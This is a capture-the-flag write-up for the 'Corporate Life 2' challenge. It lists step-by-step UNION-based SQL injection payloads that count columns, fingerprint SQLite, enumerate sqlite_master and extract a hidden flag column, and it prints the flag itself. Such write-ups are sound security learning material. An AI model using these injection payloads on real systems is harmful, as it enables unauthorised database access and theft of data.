# Corporate Life 2

Solved by: @aan
### Question:
The disgruntled employee also stashed some company secrets deep within the database, can you find them out?

### Solution:
1. It is the same step as Corporate Life 1, but then proceed with UNION SQLi
2. There is 6 columns on the table since order by 7 return false
	`{"filter": "' order by 7 -- -"}`
3. Find out if its using sqlite database
	`{"filter": "' UNION SELECT null,null,null,null,null,sqlite_version()-- -"}`
4. List all table (found flags table)
	``{"filter": "' UNION SELECT null,null,null,null,null,name FROM sqlite_master -- -"}`
5. List all column (found secret_flag colum)
	`{"filter": "' UNION SELECT null,null,null,null,null,sql FROM sqlite_master WHERE type='table'-- -"}`
6. Read the column
	`read the column `{"filter": "' UNION SELECT NULL,secret_flag,NULL,NULL,NULL,NULL FROM flags-- -"}`

**Flag:** `KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_1i5dPSQW}`
